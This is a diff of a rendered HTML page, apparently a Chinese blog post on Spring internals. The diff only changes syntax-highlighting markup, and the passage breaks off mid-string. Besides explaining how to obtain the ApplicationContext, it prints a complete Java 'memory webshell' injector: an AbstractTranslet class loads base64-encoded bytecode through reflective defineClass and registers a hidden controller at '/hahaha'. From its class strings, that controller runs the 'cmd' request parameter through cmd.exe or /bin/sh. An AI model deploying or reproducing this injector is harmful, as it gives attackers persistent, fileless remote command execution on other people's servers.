+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebApplicationContext</span><span class="o">)</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="o">,</span> <span class="n">0</span><span class="o">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>其实完全可以将存放在ServletContext属性中的Context取出来直接使用。上面代码中的<code>currentRequestAttributes()</code>替换成<code>getRequestAttributes()</code>也同样有效；getAttribute参数中的0代表从当前request中获取而不是从当前的session中获取属性值。</p>
 </li>
@@ -583,13 +583,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="c1">//反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
-</span><span class="c1"></span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">filed</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.springframework.context.support.LiveBeansView&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;applicationContexts&#34;</span><span class="o">);</span>
-<span class="c1">//属性被 private 修饰，所以setAccessible true
-</span><span class="c1"></span><span class="n">filed</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-<span class="c1">//获取一个 ApplicationContext 实例
-</span><span class="c1"></span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">WebApplicationContext</span> <span class="n">context</span> <span class="o">=(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">WebApplicationContext</span><span class="o">)</span> <span class="o">((</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LinkedHashSet</span><span class="o">)</span><span class="n">filed</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="kc">null</span><span class="o">)).</span><span class="na">iterator</span><span class="o">().</span><span class="na">next</span><span class="o">();</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">filed</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.springframework.context.support.LiveBeansView&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;applicationContexts&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//属性被 private 修饰，所以setAccessible true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">filed</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//获取一个 ApplicationContext 实例
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">WebApplicationContext</span> <span class="n">context</span> <span class="o">=(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">WebApplicationContext</span><span class="o">)</span> <span class="o">((</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LinkedHashSet</span><span class="o">)</span><span class="n">filed</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="kc">null</span><span class="o">)).</span><span class="na">iterator</span><span class="o">().</span><span class="na">next</span><span class="o">();</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>因为 org.springframework.context.support.LiveBeansView 类在 spring-context 3.2.x 版本（现在最新版本是 5.3.x）才加入其中，所以比较低版本的 spring 无法通过此方法获得 ApplicationContext 的实例。</p>
 </li>
@@ -611,15 +611,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="nd">@Controller</span>
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloController</span> <span class="o">{</span>
-    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;/hello&#34;</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">GET</span><span class="o">)</span>
-    <span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">value</span><span class="o">=</span><span class="s">&#34;name&#34;</span><span class="o">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">false</span><span class="o">,</span> <span class="n">defaultValue</span><span class="o">=</span><span class="s">&#34;World&#34;</span><span class="o">)</span> <span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">Model</span> <span class="n">model</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;name&#34;</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
-        <span class="k">return</span> <span class="s">&#34;hello&#34;</span><span class="o">;</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Controller</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloController</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;/hello&#34;</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">GET</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">value</span><span class="o">=</span><span class="s">&#34;name&#34;</span><span class="o">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">false</span><span class="o">,</span> <span class="n">defaultValue</span><span class="o">=</span><span class="s">&#34;World&#34;</span><span class="o">)</span> <span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">Model</span> <span class="n">model</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;name&#34;</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s">&#34;hello&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><ol>
 <li>Spring 2.5 - Spring 3.1之间使用
@@ -698,67 +698,67 @@ org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping�
 </span><span class="lnt">60
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.example.spring</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.context.request.ServletRequestAttributes</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.condition.PatternsRequestCondition</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.RequestMappingInfo</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.support.RequestContextUtils</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">inject</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="o">{</span>
-    <span class="kd">static</span> <span class="o">{</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="s">&#34;com.example.spring.InjectControl&#34;</span><span class="o">;</span>
-            <span class="c1">//加载com.example.spring.InjectControl类的字节码
-</span><span class="c1"></span>            <span class="n">String</span> <span class="n">b64</span> <span class="o">=</span> <span class="s">&#34;yv66vgAAADQAiQoAIQBFCABGCwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGILAEkAZgcAZwcAaAcAaQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAiTGNvbS9leGFtcGxlL3NwcmluZy9JbmplY3RDb250cm9sOwEABWxvZ2luAQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAUwcAagcAUgcAWQcAZwEAGVJ1bnRpbWVWaXNpYmxlQW5ub3RhdGlvbnMBADhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nOwEABXZhbHVlAQAIL2Zhdmljb24BAApTb3VyY2VGaWxlAQASSW5qZWN0Q29udHJvbC5qYXZhAQArTG9yZy9zcHJpbmdmcmFtZXdvcmsvc3RlcmVvdHlwZS9Db250cm9sbGVyOwwAIgAjAQADY21kBwBrDABsAG0HAG4MAG8AcAEAAAEAB29zLm5hbWUHAHEMAHIAbQwAcwB0AQADd2luDAB1AHYBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAiAHcBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAeAB5BwB6DAB7AHwMACIAfQEAAlxBDAB+AH8MAIAAgQwAggB0DACDACMHAGoMAIQAhQwAhgAjDACHAIgBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAgY29tL2V4YW1wbGUvc3ByaW5nL0luamVjdENvbnRyb2wBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9QcmludFdyaXRlcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEABWNsb3NlAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEACXNlbmRFcnJvcgEABChJKVYAIQAgACEAAAAAAAIAAQAiACMAAQAkAAAALwABAAEAAAAFKrcAAbEAAAACACUAAAAGAAEAAAAKACYAAAAMAAEAAAAFACcAKAAAAAEAKQAqAAIAJAAAAagABgAIAAAAsysSArkAAwIATiy5AAQBADoELcYAkxIFOgUSBrgAB7YACBIJtgAKmQAhuwALWQa9AAxZAxINU1kEEg5TWQUtU7cADzoGpwAeuwALWQa9AAxZAxIQU1kEEhFTWQUtU7cADzoGuwASWRkGtgATtgAUtwAVEha2ABc6BxkHtgAYmQALGQe2ABmnAAUZBToFGQe2ABoZBBkFtgAbGQS2ABwZBLYAHacADCwRAZS5AB4CAKcABE6xAAEAAACuALEAHwADACUAAABKABIAAAAOAAkADwARABAAFQARABkAEwApABQARwAWAGIAGAB4ABkAjAAaAJEAGwCYABwAnQAdAKIAHgClAB8ArgAiALEAIQCyACMAJgAAAFwACQBEAAMAKwAsAAYAGQCJAC0ALgAFAGIAQAArACwABgB4ACoALwAwAAcACQClADEALgADABEAnQAyADMABAAAALMAJwAoAAAAAACzADQANQABAAAAswA2ADcAAgA4AAAAKQAI/gBHBwA5BwA6BwA5/AAaBwA7/AAlBwA8QQcAOfgAGvkACEIHAD0AAD4AAAAOAAEAPwABAEBbAAFzAEEAAgBCAAAAAgBDAD4AAAAGAAEARAAA&#34;</span><span class="o">;</span>
-            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">BASE64Decoder</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">b64</span><span class="o">);</span>
-            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassLoader</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
-            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m0</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-            <span class="n">m0</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-            <span class="n">m0</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">classLoader</span><span class="o">,</span> <span class="n">className</span><span class="o">,</span> <span class="n">bytes</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
-
-            <span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span> <span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">());</span>
-
-            <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span> <span class="n">abstractHandlerMapping</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-
-            <span class="n">RequestMappingHandlerMapping</span> <span class="n">r</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-            <span class="c1">//通过反射获得自定义controller中唯一的Method对象
-</span><span class="c1"></span>            <span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">className</span><span class="o">).</span><span class="na">getDeclaredMethods</span><span class="o">())[</span><span class="n">0</span><span class="o">];</span>
-            <span class="c1">//定义访问controller的URL地址
-</span><span class="c1"></span>            <span class="n">PatternsRequestCondition</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PatternsRequestCondition</span><span class="o">(</span><span class="s">&#34;/hahaha&#34;</span><span class="o">);</span>
-            <span class="c1">//定义允许访问 controller 的 HTTP 方法（GET/POST）
-</span><span class="c1"></span>            <span class="n">RequestMethodsRequestCondition</span> <span class="n">ms</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RequestMethodsRequestCondition</span><span class="o">();</span>
-            <span class="c1">//在内存中动态注册 controller
-</span><span class="c1"></span>            <span class="n">RequestMappingInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RequestMappingInfo</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="n">ms</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
-            <span class="n">r</span><span class="o">.</span><span class="na">registerMapping</span><span class="o">(</span><span class="n">info</span><span class="o">,</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">className</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(),</span> <span class="n">method</span><span class="o">);</span>
-
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-
-    <span class="nd">@Override</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
-
-    <span class="o">}</span>
-
-    <span class="nd">@Override</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
-
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.example.spring</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.request.ServletRequestAttributes</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.condition.PatternsRequestCondition</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.RequestMappingInfo</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.support.RequestContextUtils</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">inject</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="s">&#34;com.example.spring.InjectControl&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//加载com.example.spring.InjectControl类的字节码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">String</span> <span class="n">b64</span> <span class="o">=</span> <span class="s">&#34;yv66vgAAADQAiQoAIQBFCABGCwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGILAEkAZgcAZwcAaAcAaQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAiTGNvbS9leGFtcGxlL3NwcmluZy9JbmplY3RDb250cm9sOwEABWxvZ2luAQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAUwcAagcAUgcAWQcAZwEAGVJ1bnRpbWVWaXNpYmxlQW5ub3RhdGlvbnMBADhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nOwEABXZhbHVlAQAIL2Zhdmljb24BAApTb3VyY2VGaWxlAQASSW5qZWN0Q29udHJvbC5qYXZhAQArTG9yZy9zcHJpbmdmcmFtZXdvcmsvc3RlcmVvdHlwZS9Db250cm9sbGVyOwwAIgAjAQADY21kBwBrDABsAG0HAG4MAG8AcAEAAAEAB29zLm5hbWUHAHEMAHIAbQwAcwB0AQADd2luDAB1AHYBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAiAHcBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAeAB5BwB6DAB7AHwMACIAfQEAAlxBDAB+AH8MAIAAgQwAggB0DACDACMHAGoMAIQAhQwAhgAjDACHAIgBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAgY29tL2V4YW1wbGUvc3ByaW5nL0luamVjdENvbnRyb2wBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9QcmludFdyaXRlcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEABWNsb3NlAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEACXNlbmRFcnJvcgEABChJKVYAIQAgACEAAAAAAAIAAQAiACMAAQAkAAAALwABAAEAAAAFKrcAAbEAAAACACUAAAAGAAEAAAAKACYAAAAMAAEAAAAFACcAKAAAAAEAKQAqAAIAJAAAAagABgAIAAAAsysSArkAAwIATiy5AAQBADoELcYAkxIFOgUSBrgAB7YACBIJtgAKmQAhuwALWQa9AAxZAxINU1kEEg5TWQUtU7cADzoGpwAeuwALWQa9AAxZAxIQU1kEEhFTWQUtU7cA